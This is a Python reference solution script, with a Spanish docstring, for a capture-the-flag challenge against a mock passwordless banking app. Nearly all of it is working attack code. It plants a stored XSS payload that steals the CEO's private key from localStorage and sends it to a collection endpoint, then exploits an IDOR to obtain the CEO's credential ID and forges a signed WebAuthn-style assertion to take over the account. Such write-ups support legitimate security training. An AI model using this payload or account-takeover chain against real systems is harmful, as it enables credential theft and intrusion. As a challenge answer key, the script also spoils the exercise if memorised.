"""
Solucion de referencia del CTF "Passwordless de Carton" (HackerBank).

El servidor solo guarda claves publicas (como FIDO2/Windows Hello real). El
ataque, sobre la ceremonia estilo WebAuthn (options + assert):
  1. Login como la cuenta de practica (registra su passkey).
  2. Deja un mensaje con un payload Stored XSS que roba la clave privada del CEO
     de su localStorage.
  3. Pide que el administrador revise su bandeja (/social/notify) -> el agente CEO
     visita su inbox y ejecuta el payload, que exfiltra la clave privada a /collect.
  4. Lee la clave privada del CEO en /collected, obtiene su credential_id por el
     IDOR de /auth/keys, firma un clientDataJSON fresco del CEO y hace el assert
     -> flag. (VULN-3: el server no vincula el challenge que emitio, pero igual
     verifica binding + firma, asi que hace falta la clave robada.)

El estudiante hace el paso 4 (la firma) desde la consola del navegador con
helloForge(); aca se hace en Python para tener un writeup ejecutable.

Requisitos:  pip install requests cryptography
Uso:         python solve.py [http://host:5000]
"""
import base64
import html
import json
import re
import sys
import time

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:5000"
PRACTICE = "t3ny"
CEO_USERNAME = "ceo"

PAYLOAD = (
    "Hola, necesito ayuda con mi cuenta.\n"
    "<script>\n"
    "window.addEventListener('load', function () {\n"
    "  var user = document.getElementById('nombre_usuario').innerText;\n"
    "  if (user !== '" + PRACTICE + "') {\n"
    "    var priv = localStorage.getItem('hb_privkey_' + user);\n"
    "    new Image().src = '/collect?data=' + encodeURIComponent(priv);\n"
    "  }\n"
    "});\n"
    "</script>"
)


def raw_sig(priv, message_bytes):
    """Firma ECDSA-SHA256 sobre `message_bytes`, en formato raw r||s hex (WebCrypto)."""
    der = priv.sign(message_bytes, ec.ECDSA(hashes.SHA256()))
    r, s = decode_dss_signature(der)
    return (r.to_bytes(32, "big") + s.to_bytes(32, "big")).hex()


def priv_to_pkcs8_b64(priv):
    der = priv.private_bytes(serialization.Encoding.DER, serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption())
    return base64.b64encode(der).decode()


def b64url(data_bytes):
    return base64.urlsafe_b64encode(data_bytes).decode().rstrip("=")


def client_data_json(challenge):
    """clientDataJSON de la assertion (como WebAuthn: type/challenge/origin)."""
    return json.dumps({"type": "webauthn.get", "challenge": challenge, "origin": BASE},
                      separators=(",", ":"))


def options(s, username):
    return s.post(f"{BASE}/auth/hello/options", json={"username": username}).json()


def do_assert(s, username, cred_id, priv, challenge):
    cdj = client_data_json(challenge).encode("utf-8")
    body = {
        "username": username,
        "id": cred_id,
        "type": "public-key",
        "response": {
            "clientDataJSON": b64url(cdj),
            "authenticatorData": b64url(b"hackerbank-authenticator-data"),
            "signature": raw_sig(priv, cdj),
        },
    }
    return s.post(f"{BASE}/auth/hello/assert", json=body).json()


def register_and_login(s, username):
    """Registra una passkey para `username` y abre sesion. Devuelve (priv, credential_id)."""
    priv = ec.generate_private_key(ec.SECP256R1())
    pub_pem = priv.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    cred_id = "cli-" + priv_to_pkcs8_b64(priv)[10:26]
    s.post(f"{BASE}/auth/register", json={"username": username, "credential_id": cred_id, "public_key": pub_pem})
    opt = options(s, username)
    v = do_assert(s, username, cred_id, priv, opt["challenge"])
    if not v.get("ok"):
        raise SystemExit(f"[!] No pude loguearme como {username}: {v}")
    return priv, cred_id


def main():
    s = requests.Session()

    # 1) login como la cuenta de practica
    register_and_login(s, PRACTICE)
    print(f"[1] Logueado como '{PRACTICE}'.")

    # 2) dejar el mensaje con el payload XSS
    s.post(f"{BASE}/messages", json={"body": PAYLOAD})
    print("[2] Mensaje con payload XSS dejado en la bandeja del administrador.")

    # 3) pedir que el administrador revise su bandeja -> el agente CEO ejecuta el payload
    s.post(f"{BASE}/social/notify", json={})
    print("[3] Pedida la revisión del CEO. Esperando la exfiltración...")

    # 4) esperar y leer la clave privada robada del buzon
    ceo_priv_b64 = None
    for _ in range(30):
        time.sleep(1)
        page = s.get(f"{BASE}/collected").text
        for m in re.findall(r'<div class="data">([^<]+)</div>', page):
            candidate = html.unescape(m).strip()
            if candidate and candidate != "None" and len(candidate) > 80:
                ceo_priv_b64 = candidate
                break
        if ceo_priv_b64:
            break
    if not ceo_priv_b64:
        raise SystemExit("[!] No llegó la clave al buzón (¿el agente CEO está corriendo?).")
    print(f"[4] Clave privada del CEO robada del buzón: {ceo_priv_b64[:32]}...")

    # 5) credential_id del CEO por el IDOR (por nombre de usuario)
    keys = s.get(f"{BASE}/auth/keys/{CEO_USERNAME}").json()
    ceo_cred_id = keys["credential_id"]
    print(f"[5] credential_id del CEO (IDOR /auth/keys/{CEO_USERNAME}): {ceo_cred_id}")

    # 6) firmar un clientDataJSON fresco del CEO con la clave robada y entrar
    ceo_priv = serialization.load_der_private_key(base64.b64decode(ceo_priv_b64), password=None)
    opt = options(s, "ceo")
    v = do_assert(s, "ceo", ceo_cred_id, ceo_priv, opt["challenge"])
    if not v.get("ok"):
        raise SystemExit(f"[!] Falló el login como CEO: {v}")
    print(f"[6] Autenticados como el CEO. Redirige a: {v['next']}")

    dashboard = s.get(f"{BASE}{v['next']}").text
    flag = re.search(r"flag-code[^>]*>\s*([0-9a-f]{32})\s*<", dashboard)
    print(f"\n>>> CODIGO GANADOR: {flag.group(1) if flag else '(no encontrada)'}")


if __name__ == "__main__":
    main()
